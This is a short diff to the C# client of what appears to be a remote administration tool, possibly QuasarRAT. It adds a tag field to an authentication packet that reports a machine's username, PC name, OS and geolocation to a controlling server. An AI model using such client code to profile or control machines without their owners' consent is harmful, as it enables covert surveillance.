@@ -18,7 +18,7 @@ namespace xClient.Core.Commands
             GeoLocationHelper.Initialize();
             new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
                 GeoLocationHelper.Country, GeoLocationHelper.CountryCode, GeoLocationHelper.Region, GeoLocationHelper.City, GeoLocationHelper.ImageIndex,
-                SystemCore.GetId(), SystemCore.GetUsername(), SystemCore.GetPcName()).Execute(client);
+                SystemCore.GetId(), SystemCore.GetUsername(), SystemCore.GetPcName(), Settings.TAG).Execute(client);
         }
 
         public static void HandleDoClientUpdate(Packets.ServerPackets.DoClientUpdate command, Client client)
